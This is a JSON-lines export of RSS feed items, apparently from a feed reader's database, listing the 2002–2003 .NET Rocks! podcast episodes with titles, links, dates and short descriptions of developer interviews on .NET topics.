{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=42","title":"Pat Hynds on Security","published":{"$wrap":"$date","v":1069706587000,"h":"2003-11-24T20:43:07.000Z"},"starred":false,"read":false,"content":"Carl talks with pat about Security, from the general concepts to the practical tips and in between. Pat draws on his millitary background to render a keen understanding of how to secure today's complex systems. You will pick up some great tips, and hopefully start thinking of security issues in your everyday development efforts after listening to this show. Pat Rocks!","author":false,"_id":{"$wrap":"$oid","v":850}}
{"k":"0000000082","o":"0000000315","v":"001"}
{"_id":851,"_uid":851,"_dt":1373728934396,"_s":"a6bbe58b88210b79249b3a79bcc95e83"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=41","title":"The .NET Rocks Quiz Show at the PDC","published":{"$wrap":"$date","v":1068496987000,"h":"2003-11-10T20:43:07.000Z"},"starred":false,"read":false,"content":false,"author":false,"_id":{"$wrap":"$oid","v":851}}
{"k":"0000000082","o":"0000000551","v":"001"}
{"_id":852,"_uid":852,"_dt":1373728934397,"_s":"66b1fb7842311f65396a10734b5840a1"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=40","title":"Robert Scoble on Blogging","published":{"$wrap":"$date","v":1067287387000,"h":"2003-10-27T20:43:07.000Z"},"starred":false,"read":false,"content":"Carl and Mark talk to Robert about Blogging, Longhorn, and the PDC. Lots of great stories, blogging for dummies, and a sneak peak at what happened at the PDC. They also talk about security, and Merrill Lynch's open letter to Sun, among other things.","author":false,"_id":{"$wrap":"$oid","v":852}}
{"k":"0000000082","o":"0000000792","v":"001"}
{"_id":853,"_uid":853,"_dt":1373728934397,"_s":"d821d4795b09a1acd73b8cdc6a2ef880"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=39","title":"Scott Guthrie on ASP.NET 2.0","published":{"$wrap":"$date","v":1065472987000,"h":"2003-10-06T20:43:07.000Z"},"starred":false,"read":false,"content":"Carl and Mark chat with Scott about the new features of ASP.NET 2.0 (code-named Whidbey). Scott's keen understanding of the high and low-level features of Whidbey, Yukon, and IIS 6.0 really shine through in this interview where the topics include performance, caching and cache dependency, VS.NET tools, data access, using Yukon with ASP.NET 2.0, sharing session state, backward-compatibility, and code enhancements as well as a time-frame for when to expect alphas, betas, and the like.","author":false,"_id":{"$wrap":"$oid","v":853}}
{"k":"0000000082","o":"0000001041","v":"001"}
{"_id":854,"_uid":854,"_dt":1373728934398,"_s":"604c4dd336af974a4e93750608a4a194"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=38","title":"Carl and Mark at the Dutch Tavern","published":{"$wrap":"$date","v":1064263387000,"h":"2003-09-22T20:43:07.000Z"},"starred":false,"read":false,"content":"This week Carl and Mark throw down a few pints at the historic Dutch Tavern in downtown New London, CT and you're invited! Listen to stories from their recent week of teaching a VB.NET class to 27 people, challenging code puzzles, interesting characters, and of course, beer.This is a very relaxed show, but don't think you won't learn a thing or two. C'mon! Just have one more Black and Tan!Note: The show starts out a bit noisy, then gets better. There were some rowdy people in there when we first started recording, and they left shortly afterwords.Another Note: We found out about feedster.com well after we had recorded this show. Feedster is indeed the \"google for blogs\" that Carl and Mark were talking about in the show.","author":false,"_id":{"$wrap":"$oid","v":854}}
{"k":"0000000082","o":"0000001055","v":"001"}
{"_id":855,"_uid":855,"_dt":1373728934400,"_s":"0fabb76ef63ddeaa88f93ff9bebab6c7"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=37","title":"Microsoft VB.NET Team","published":{"$wrap":"$date","v":1063053787000,"h":"2003-09-08T20:43:07.000Z"},"starred":false,"read":false,"content":"This is a rare opportunity to have a conversation with people at Microsoft who are so closely tied to VB and VB.NET. They talked about new features in Whidbey, the next version of Visual Basic expected out in 2004 sometime, including some features that nobody knows about outside of the Alpha program! You'll have to listen to find out what they are!Carl and Mark talked about the things they like and have disliked about VB in the past, and how VB.NET has really brought the language to the forefront of the serious development community. As well, they ask some interesting questions like, \"what parts of the .NET Framework were written in VB.NET\" and other goodies. There are plenty of laughs as well. If you're a VB programmer, you've got to hear this!","author":false,"_id":{"$wrap":"$oid","v":855}}
{"k":"0000000082","o":"0000000713","v":"001"}
{"_id":856,"_uid":856,"_dt":1373728934401,"_s":"efcd3129f2b09bf62dd0b0ebf49b7654"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=36","title":"Marcie Robillard on the ASP.NET DataGrid","published":{"$wrap":"$date","v":1061844187000,"h":"2003-08-25T20:43:07.000Z"},"starred":false,"read":false,"content":"Her area of expertise is (obviously) the ASP.NET DataGrid. She talks with Mark and Carl about various aspects of the DataGrid. She talks about common mistakes, common solutions, workarounds, what is it best suited for, what is it not suited well for, etc.Marcie also talks about Inheritance and web controls, managing viewstate, custom columns, blogging, and some of her favorite books on ASP.NET","author":false,"_id":{"$wrap":"$oid","v":856}}
{"k":"0000000082","o":"0000000711","v":"001"}
{"_id":857,"_uid":857,"_dt":1373728934402,"_s":"daf701cbbc66b59d3ba0a71957c00774"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=35","title":"Brent Rector on Intellectual Property and CAS","published":{"$wrap":"$date","v":1060634587000,"h":"2003-08-11T20:43:07.000Z"},"starred":false,"read":false,"content":"Mark and Carl talk with Brent about intellectual property, namely assembly and application obfuscation: techniques used, and the resultant binaries. They also talk about Remoting and get Brent's take on the value of Remoting.But the big gem in this show, we think, is Brent's 5-minute description of how Code Access Security works, which we immediately recognize as something very special.","author":false,"_id":{"$wrap":"$oid","v":857}}
{"k":"0000000082","o":"0000000716","v":"001"}
{"_id":858,"_uid":858,"_dt":1373728934403,"_s":"22f5494c782dfd764d7399b4c1e134fe"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=34","title":"Juval Löwy (Again)","published":{"$wrap":"$date","v":1058820187000,"h":"2003-07-21T20:43:07.000Z"},"starred":false,"read":false,"content":"This week, Carl and Mark talk to Juval Lowy about, among other things, the new version of C# (2.0). Of the new features, Juval's favorite is Generics. Generics allow you to define data structures without committing to actual data types. This results with significant performance boost, higher quality code and faster development, because you get to reuse data processing algorithms without duplicating type-specific code","author":false,"_id":{"$wrap":"$oid","v":858}}
{"k":"0000000082","o":"0000000862","v":"001"}
{"_id":859,"_uid":859,"_dt":1373728934404,"_s":"9dd9ef604972692d33e099d413b641dd"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=33","title":"Carl and Mark Fly Solo!","published":{"$wrap":"$date","v":1058215387000,"h":"2003-07-14T20:43:07.000Z"},"starred":false,"read":false,"content":"This week Carl and Mark got to do a show they've been waiting for a long time to do. The conversation touches on the new application blocks (bluebricks - from the MS Patterns and Practices Group), string handling, using the BitConverter class for fast file i/o, serialization, XMLDataDocuments and XSLT, inheritance, instrumentation, the ASP.NET Cache object, and some great stories from the trenches, especially Mark's great training stories which always contain an array of shady characters and companies. All in all, its an hour well spent for .NET developers","author":false,"_id":{"$wrap":"$oid","v":859}}
{"k":"0000000082","o":"0000001056","v":"001"}
{"_id":860,"_uid":860,"_dt":1373728934405,"_s":"9113793386bea924239e9eb5074461ac"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=32","title":"Matthew Reynolds (.NET 247)","published":{"$wrap":"$date","v":1057610587000,"h":"2003-07-07T20:43:07.000Z"},"starred":false,"read":false,"content":"Carl engaged Matthew in a lively discussion about his incredible website (.NET 24/7) which provides instant gratification for help on any of the classes in the .NET framework in the form of links to published articles, newsgroup discussions, and blog entries. Matthew is a big fan of weblogs, which he discusses in the interview.They also talked about the C# vs. VB.NET issue, and other issues associated with particular languages. As well, the conversation touched on the next versions of the framework and VS.NET.Matthew is happy to receive comments or feedback on any topic via his webblog at weblogs.asp.net.Please don't send us email about the poor quality of the audio. The source recording was not good, and we have made it as good as it can be.","author":false,"_id":{"$wrap":"$oid","v":860}}
{"k":"0000000082","o":"0000000487","v":"001"}
{"_id":861,"_uid":861,"_dt":1373728934406,"_s":"696353d665bcf00c762e6af5c90e1426"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=31","title":"Tim Huckaby","published":{"$wrap":"$date","v":1057005787000,"h":"2003-06-30T20:43:07.000Z"},"starred":false,"read":false,"content":"Tim talks about projects, demos, info-path, drinking water out of a vodka bottle, VS Tools for Office, Speaking at Tech-Ed, smart clients and all the stuff he learned working at Microsoft in Redmond.","author":false,"_id":{"$wrap":"$oid","v":861}}
{"k":"0000000082","o":"0000001297","v":"001"}
{"_id":862,"_uid":862,"_dt":1373728934407,"_s":"4cbb2df9e5b9c0af49180077ec31bb17"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=30","title":"INETA","published":{"$wrap":"$date","v":1056400987000,"h":"2003-06-23T20:43:07.000Z"},"starred":false,"read":false,"content":"The International .NET Association (INETA) provides structured, peer-based organizational, educational, and promotional support to the growing worldwide community of Microsoftr .NET user groups. INETA's mission is to offer assistance and resources to community groups that promote and educate their membership in Microsofts .NET technologies. INETA welcomes all facets of the .NET user community, from developers and architects to project managers and IT professionals. Members can be user groups or special interest groups that:Focus on a single aspect of .NET, such as VB.NET, C#, ASP.NET, ADO.NET, etc. Target the entire .NET platform Concentrate on other technologies but are also interested in .NET  INETA is the next evolution in user group communities - a non-profit, independent organization, chartered with supporting all user groups interested in the Microsoft .NET platform. INETA is run by a board of user group leaders, elected by their peers, and supported by Microsoft Corporation and other sponsors.","author":false,"_id":{"$wrap":"$oid","v":862}}
{"k":"0000000082","o":"0000001242","v":"001"}
{"_id":863,"_uid":863,"_dt":1373728934409,"_s":"4d2ae77d82849144352bb535f16620b2"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=29","title":"Microsoft .NET Evangelism Team","published":{"$wrap":"$date","v":1055796187000,"h":"2003-06-16T20:43:07.000Z"},"starred":false,"read":false,"content":"This show is a lively and candid conversation with three members of the Microsoft .NET Evangelism team.  In this episode Mark takes a break to enjoy his sons last baseball game of the season. Carl talks to the team about what they do and how their efforts impact the quality of the framework and developer tools in general.Get a behind-the-scenes look at the daily operations of the .NET Evangelism team and how it operates. Other topics include companies that Microsoft has worked with as early adopters, Visual Basic.NET vs C#, why Regional Directors are so special (grin), why web services are the new focus of the .NET moniker and why it gives developers severe acid reflux, why developers are still stuck on nanosecond-level performance differences, differences between DevDays; Tech-Ed; and the Professional Developers Conference (PDC). Fascinating stuff. Also, Carl plays a wicked cool guitar piece in lieu of the first ad spot!","author":false,"_id":{"$wrap":"$oid","v":863}}
{"k":"0000000082","o":"0000000630","v":"001"}
{"_id":864,"_uid":864,"_dt":1373728934410,"_s":"3b400889f8caca1d4ef08393f7596eae"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=28","title":"Chris Sells (Again)","published":{"$wrap":"$date","v":1055191387000,"h":"2003-06-09T20:43:07.000Z"},"starred":false,"read":false,"content":"Chris talks with Carl and Mark about Longhorn, Working at Microsoft, his book with Don Box, his new Windows Forms book, dealing with Printer Margins, passing command-line arguments to auto-deployed applications, linking assemblies, the new Matrix movie, whats new in Ghengis, and answers the age old question \"to GAC or not to GAC?\"","author":false,"_id":{"$wrap":"$oid","v":864}}
{"k":"0000000082","o":"0000000609","v":"001"}
{"_id":865,"_uid":865,"_dt":1373728934411,"_s":"ce83e9de098c2be8e94d7f80cb826c2e"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=27","title":"Jorge Oblitas","published":{"$wrap":"$date","v":1054586587000,"h":"2003-06-02T20:43:07.000Z"},"starred":false,"read":false,"content":"Carl and Mark talk to Jorge about how developers think, their approach to problem solving, how Microsoft makes development too easy sometimes, and about how developers think of their role in their companies.This is a fun interview. We even got to talk about music (Jorge is a bass player) and booze (of course!) in Peru","author":false,"_id":{"$wrap":"$oid","v":865}}
{"k":"0000000082","o":"0000000741","v":"001"}
{"_id":866,"_uid":866,"_dt":1373728934412,"_s":"fe7888fb6107862a6758a11bb8da0da9"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=26","title":"Ingo Rammer","published":{"$wrap":"$date","v":1053376987000,"h":"2003-05-19T20:43:07.000Z"},"starred":false,"read":false,"content":"Carl caught up with Ingo at the New Orleans Hilton during DevConnections, a conference where they were both speaking. Carl and ingo talk all about .NET Remoting, and Ingo shares some critical insights that come from his experiences with Remoting.Ingo also talks about the new WSE (Web Service Extentions). Nicolas Landry stops by and talks about his experiences at DevConnections, Java compatibility with SOAP, SmartPhones, and other intersting tidbits.","author":false,"_id":{"$wrap":"$oid","v":866}}
{"k":"0000000082","o":"0000000477","v":"001"}
{"_id":867,"_uid":867,"_dt":1373728934413,"_s":"6c6f9c2fb974684fbe341e19f61e2edf"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=25","title":"Russ Fustino","published":{"$wrap":"$date","v":1052167387000,"h":"2003-05-05T20:43:07.000Z"},"starred":false,"read":false,"content":"Russ talks with us about the Windows Server 2003 and Visual Studio.NET 2003 launch (recorded the same day), what's new in VS.NET 2003, upgrading, and what's new in the New England district","author":false,"_id":{"$wrap":"$oid","v":867}}
{"k":"0000000082","o":"0000000689","v":"001"}
{"_id":868,"_uid":868,"_dt":1373728934414,"_s":"57dbe086ca29bfda880f11ca0151dd88"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=24","title":"Michael Stuart","published":{"$wrap":"$date","v":1051562587000,"h":"2003-04-28T20:43:07.000Z"},"starred":false,"read":false,"content":"He talks with us about the current blocks available, for ADO.NET and Exception Handling, and also gives us a sneak peek at the next bluebricks coming down the road, including a User Interface facade layer, an application updater (using the BITS Background Internet Transfer Service), and a Configuration Manager block for dealing with config files, including code for persisting connection strings.","author":false,"_id":{"$wrap":"$oid","v":868}}
{"k":"0000000082","o":"0000000972","v":"001"}
{"_id":869,"_uid":869,"_dt":1373728934414,"_s":"0b0da6a08bb707a3e74cc6e6f8c01e30"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=23","title":"Dino Esposito","published":{"$wrap":"$date","v":1050957787000,"h":"2003-04-21T20:43:07.000Z"},"starred":false,"read":false,"content":"Dino shares some valuable tips and insights into the innerworkings of ASP.NET security, IIS Impersonation, how VIEWSTATE is encoded, the serialization engine, how to store encrypted values in the registry, inline code vs. CodeBehind, and Italian Rock bands. We also learn that Dino has an extreme distaste for barbeque.Dino shares some topics of some of his best articles, including an ASP.NET control that generates a bar chart with pure html tables. He talks about one of the talks that he'll be doing at DevConnections in which he shows you how to write Plug-ins that users can add into your applications.He also talked about his new 1000-page book, Programming Microsoft ASP.NET","author":false,"_id":{"$wrap":"$oid","v":869}}
{"k":"0000000082","o":"0000000519","v":"001"}
{"_id":870,"_uid":870,"_dt":1373728934416,"_s":"6543eb70b40960d7a9d2d97e9b6b2ebb"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=22","title":"Paul Sheriff","published":{"$wrap":"$date","v":1050352987000,"h":"2003-04-14T20:43:07.000Z"},"starred":false,"read":false,"content":"Paul talks with Mark and Carl about ASP.NET performance tuning, tips, viewstate info, smart navigation, layout mode and more, and Paul shares some great insights and stories from the field. Lots of great tips and information here.","author":false,"_id":{"$wrap":"$oid","v":870}}
{"k":"0000000082","o":"0000000438","v":"001"}
{"_id":871,"_uid":871,"_dt":1373728934417,"_s":"905eddff0480fb5de006099033c90294"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=21","title":"Andrew Brust","published":{"$wrap":"$date","v":1049143387000,"h":"2003-03-31T20:43:07.000Z"},"starred":false,"read":false,"content":"Carl and Mark talk to Andrew about data binding, data adapters, connected and dis-connected models, stored procedures, performance and encapsulation.","author":false,"_id":{"$wrap":"$oid","v":871}}
{"k":"0000000082","o":"0000000553","v":"001"}
{"_id":872,"_uid":872,"_dt":1373728934417,"_s":"19b05c5a87ef693dda2a1d724dde23c2"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=20","title":"Ethan Winer and Bob Zale","published":{"$wrap":"$date","v":1048538587000,"h":"2003-03-24T20:43:07.000Z"},"starred":false,"read":false,"content":"Carl and Mark talk with Ethan and Bob about the Good Old Days of the BASIC language, and some of their experiences early on in the first days of the industry, as well as PowerBASIC past, present, and future, crazy tech-support calls, and other stories.","author":false,"_id":{"$wrap":"$oid","v":872}}
{"k":"0000000082","o":"0000000659","v":"001"}
{"_id":873,"_uid":873,"_dt":1373728934418,"_s":"35d63f6ce26210b7b7b6d5401c59729f"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=19","title":"Stephen Forte","published":{"$wrap":"$date","v":1047933787000,"h":"2003-03-17T20:43:07.000Z"},"starred":false,"read":false,"content":"Stephen talks about the International .NET Association (INETA - www.ineta.org), relates his .NET success stories, and talks about design patterns, COM Interop, Performance Anxiety, ASP.NET Forms Authentication, ViewState, Caching, and the DataGrid control. The DataGrid Girl (www.datagridgirl.com) calls and yaks with Carl, Mark, and Stephen about the ASP.NET DataGrid.","author":false,"_id":{"$wrap":"$oid","v":873}}
{"k":"0000000082","o":"0000000530","v":"001"}
{"_id":874,"_uid":874,"_dt":1373728934419,"_s":"d25edd3836c7ad60fe2e3889a5e22f22"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=18","title":"Bill Vaughn (Again)","published":{"$wrap":"$date","v":1047328987000,"h":"2003-03-10T20:43:07.000Z"},"starred":false,"read":false,"content":"Bill talks with us again picking up where our last conversation with him left off, talking about ADO.NET concurrency, SQL database design, dealing with Data Adapters, and a few other interesting tangents. Always good stuff with Mr. V!","author":false,"_id":{"$wrap":"$oid","v":874}}
{"k":"0000000082","o":"0000000741","v":"001"}
{"_id":875,"_uid":875,"_dt":1373728934420,"_s":"25de61932f54f0e100b90fcb9ec4d0d9"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=17","title":"Scott Hanselman","published":{"$wrap":"$date","v":1046724187000,"h":"2003-03-03T20:43:07.000Z"},"starred":false,"read":false,"content":"Mark Dunn is on temporary leave in Redmond, WA this week teaching a beta Architecture class. Scott and Carl chat about .NET, C#, Reflection, Regular Expressions, Freeware, Code Sharing, Config Files, Sockets, Multi-Threaded programming, and a laundry list of Scott's favorite utilities (shown below) that you just have to check out.We had a few comments that the shows were not loud enough. So, starting with this show the volume has been maximized.","author":false,"_id":{"$wrap":"$oid","v":875}}
{"k":"0000000082","o":"0000000687","v":"001"}
{"_id":876,"_uid":876,"_dt":1373728934421,"_s":"3f0522d02ebc79ecca845dbcaec52bdb"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=16","title":"Alan Cooper","published":{"$wrap":"$date","v":1043700187000,"h":"2003-01-27T20:43:07.000Z"},"starred":false,"read":false,"content":"Alan has a lot to say about programming, programmers, and focuses intently on what's wrong with programming as we know it. Why do businesspeople fear programmers? Is the construction of software managed? These topics and more are the focus of this monumental episode of .NET Rocks!Alan tells the story of that meeting where he showed Visaul Basic (then code-named Ruby) to Bill Gates and his people.","author":false,"_id":{"$wrap":"$oid","v":876}}
{"k":"0000000082","o":"0000000415","v":"001"}
{"_id":877,"_uid":877,"_dt":1373728934422,"_s":"fccc3b8d60348e6beb55ba0fe94b9a6c"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=15","title":"Michèle Leroux Bustamante","published":{"$wrap":"$date","v":1043095387000,"h":"2003-01-20T20:43:07.000Z"},"starred":false,"read":false,"content":"Michele discusses the differences between programming in Java space vs. .NET from her own first hand experience.","author":false,"_id":{"$wrap":"$oid","v":877}}
{"k":"0000000082","o":"0000000567","v":"001"}
{"_id":878,"_uid":878,"_dt":1373728934423,"_s":"1de20b9fafbcda9bb22a6be91213785c"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=14","title":".NET Sucess Stories Part 1","published":{"$wrap":"$date","v":1042490587000,"h":"2003-01-13T20:43:07.000Z"},"starred":false,"read":false,"content":"This is the first of a series of shows we are going to do this year highlighting .NET Success Stories; companies that have implemented .NET applications successfully as either pilot projects or production projects. In this show we hear from two different companies","author":false,"_id":{"$wrap":"$oid","v":878}}
{"k":"0000000082","o":"0000000469","v":"001"}
{"_id":879,"_uid":879,"_dt":1373728934424,"_s":"3c5f0316ef2a4359dc1831b9fdb3b99e"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=13","title":"Ken Getz","published":{"$wrap":"$date","v":1040676187000,"h":"2002-12-23T20:43:07.000Z"},"starred":false,"read":false,"content":"Ken talks about asynchronous calls, events, delegates, the next version of Microsoft Office, printing, C# vs VB.NET, being a control freak, Visual Studio.NET 2003, and training videos.","author":false,"_id":{"$wrap":"$oid","v":879}}
{"k":"0000000082","o":"0000000553","v":"001"}
{"_id":880,"_uid":880,"_dt":1373728934425,"_s":"3df5a4cbd4297f43e0cf576c4adc4ca3"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=12","title":"Nickolas Landry","published":{"$wrap":"$date","v":1040071387000,"h":"2002-12-16T20:43:07.000Z"},"starred":false,"read":false,"content":"Carl and Mark talk with Nick about Mobile computing, and how .NET fully supports mobile devices. A surprise phone call from Tim Huckaby forces us to extend this lousy show for an extra half-hour, but you'll be glad you stuck it out to hear his Bill Gates story.","author":false,"_id":{"$wrap":"$oid","v":880}}
{"k":"0000000082","o":"0000000548","v":"001"}
{"_id":881,"_uid":881,"_dt":1373728934426,"_s":"b735cc619ac0e4ec91c4e490840ff3cb"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=11","title":"Scott Stanfield","published":{"$wrap":"$date","v":1039466587000,"h":"2002-12-09T20:43:07.000Z"},"starred":false,"read":false,"content":"Scott talks about the human side of software development, the .NET Pet Shop wars; a now famous head-to-head battle between .NET and Java, and talks about his company, Vertigo Software, and the work that they do with .NET including the Pet Shop application.","author":false,"_id":{"$wrap":"$oid","v":881}}
{"k":"0000000082","o":"0000001111","v":"001"}
{"_id":882,"_uid":882,"_dt":1373728934427,"_s":"8890daf43d8dff0bd31269e112c0bf15"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=10","title":"Chris Sells","published":{"$wrap":"$date","v":1038861787000,"h":"2002-12-02T20:43:07.000Z"},"starred":false,"read":false,"content":"Chris talks with Test with Carl and Mark about COM and .NET components, finalizers, disposing, Smart Client Windows Forms Applications (we still don't know what to call these things), how to navigate sellsbrothers.com, interview weed-out questions, and why he calls it Sells Brothers. Also, Chris finally clears up the age-old question of why C++ programmers feel so superior to mere humans.Chris' main web page is www.sellsbrothers.com. There you can subscribe to his many lists and take advantage of all the great free information and code he shares with the community. Chris writes regularly for MSDN Magazine on advanced topics.Trust us, you will save yourself hours of guesswork by taking an hour and a half of your day to listen to this interview. This show was actually recorded in mid-November, and its still fresh!","author":false,"_id":{"$wrap":"$oid","v":882}}
{"k":"0000000082","o":"0000000547","v":"001"}
{"_id":883,"_uid":883,"_dt":1373728934428,"_s":"b701509e4b87484b21ac5434bfcab5d2"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=9","title":"Dev Connections","published":{"$wrap":"$date","v":1035820800000,"h":"2002-10-28T16:00:00.000Z"},"starred":false,"read":false,"content":".NET Rocks! went on the road to VS.NET Connections, an awesome .NET developer conference in Orlando, FL that took place October 27-30, 2002.We have two hours of interviews with speakers and attendees, which make for a really enjoyable and informative show.","author":false,"_id":{"$wrap":"$oid","v":883}}
{"k":"0000000082","o":"0000000529","v":"001"}
{"_id":884,"_uid":884,"_dt":1373728934428,"_s":"0f6983d6f052c71d0a9a3dc67e5d0aff"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=7","title":"Bill Vaughn","published":{"$wrap":"$date","v":1034628187000,"h":"2002-10-14T20:43:07.000Z"},"starred":false,"read":false,"content":"Carl and Mark talk to bill about ADO.NET, DataAdapters, Yukon, Concurrency, JET (Bill Hates Jet), MSDE, DTS, and other critical stuff. This is classic Vaughn!This is also the genesis of the messy hair joke that permeates our shows and videos.","author":false,"_id":{"$wrap":"$oid","v":884}}
{"k":"0000000082","o":"0000000539","v":"001"}
{"_id":885,"_uid":885,"_dt":1373728934430,"_s":"cd50b6f77cf9c726b64ee0241d2b852d"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=6","title":"Mark Anders","published":{"$wrap":"$date","v":1034023387000,"h":"2002-10-07T20:43:07.000Z"},"starred":false,"read":false,"content":"Carl and Mark talk with Mark Anders about ASP.NET, Framework v1.1, Languages, IIS 6.0, and other great topics. This week we had some celebrity callers: Chris Sells and MSDN Regional Director Stephen Forte ring the show, making for some great tech talk.","author":false,"_id":{"$wrap":"$oid","v":885}}
{"k":"0000000082","o":"0000000683","v":"001"}
{"_id":886,"_uid":886,"_dt":1373728934430,"_s":"1735aea50eaecf7a02588a8de837317e"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=5","title":"Jonathan Zuck","published":{"$wrap":"$date","v":1033358400000,"h":"2002-09-30T04:00:00.000Z"},"starred":false,"read":false,"content":"Carl and Mark have a great chat with Jonathan Zuck about protecting the free market system from anti-competitive legislation championed by companies that want to use Washington to limit the power and effectiveness of their competitors. Not only that, but they talk about some new announcements by Microsoft about what we can expect from new versions, and from Microsoft in the immediate future.","author":false,"_id":{"$wrap":"$oid","v":886}}
{"k":"0000000082","o":"0000000687","v":"001"}
{"_id":887,"_uid":887,"_dt":1373728934431,"_s":"eaf58e3979f1624e5d089659c0f884e0"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=4","title":"Juval Löwy","published":{"$wrap":"$date","v":1032813787000,"h":"2002-09-23T20:43:07.000Z"},"starred":false,"read":false,"content":"Carl and Mark have an enlightening talk with Juval Löwy about COM+ Enterprise Services, and how they relate to .NET. If you thought Enterprise Services (COM+) was just about Transactions and Object Pooling, you've got to check this out. Juval believes that we will all be using Enterprise Services in the near future because it will be time-prohibitive (and therefore cost-prohibitive) not to do so.","author":false,"_id":{"$wrap":"$oid","v":887}}
{"k":"0000000082","o":"0000000908","v":"001"}
{"_id":888,"_uid":888,"_dt":1373728934433,"_s":"3d07febe20a1d02151ffd3101380a7a7"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=3","title":"Billy Hollis","published":{"$wrap":"$date","v":1032208987000,"h":"2002-09-16T20:43:07.000Z"},"starred":false,"read":false,"content":"This week Carl and Mark interview Billy Hollis, noted speaker and .NET expert. Billy and Rockford Lhotka had the first VB.NET book on the market from Wrox Press. Since then, Billy has taught VB.NET classes and done consulting for major companies, as well as authoring (or co-authoring) at least 8 books on .NET.He is the MSDN Regional Director (RD) for Tennessee, and was RD of the year in 2001. He authors many articles, including a regular column at MSDN called Adventures in VB.NETBilly talks about ASP.NET vs Smart Client applications, Remoting, and offers lots of great advice and information to VB.NET programmers.","author":false,"_id":{"$wrap":"$oid","v":888}}
{"k":"0000000082","o":"0000000688","v":"001"}
{"_id":889,"_uid":889,"_dt":1373728934434,"_s":"06a4b4e385dd79a309c89880eea6eecc"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=2","title":"Dan Appleman","published":{"$wrap":"$date","v":1031587200000,"h":"2002-09-09T16:00:00.000Z"},"starred":false,"read":false,"content":"This, our second show was recorded live from the Microsoft Offices in Waltham, MA at the montly meeting of the .NET User Group of Greater Boston.Carl and Mark interview Dan Appleman of Desaware, Inc. Dan shares his insights into .NET and offers advice to shops looking at moving to .NET. Topics include Interop, obfuscators, assemblies and memory, performance, C# vs VB.NET, State Machines, and more.","author":false,"_id":{"$wrap":"$oid","v":889}}
{"k":"0000000082","o":"0000000577","v":"001"}
{"_id":890,"_uid":890,"_dt":1373728934435,"_s":"e3c20d1b2d231670d0d7bbf2ac897134"}
{"subscription":{"$wrap":"$oid","v":2},"link":"http://www.dotnetrocks.com/default.aspx?ShowNum=1","title":"Pat Hynds","published":{"$wrap":"$date","v":1030723200000,"h":"2002-08-30T16:00:00.000Z"},"starred":false,"read":false,"content":"Look out! It's .NET Rocks! In this, the premiere episode, Carl interviews Pat Hynds from Critical Sites, a Sun Partner, IBM Partner, and Microsoft Partner. He shares his insights into .NET and provides real-world stories of development in J2EE and Visual Studio.NET, and compares the results.","author":false,"_id":{"$wrap":"$oid","v":890}}
{"k":"0000000082","o":"0000002597","v":"001"}
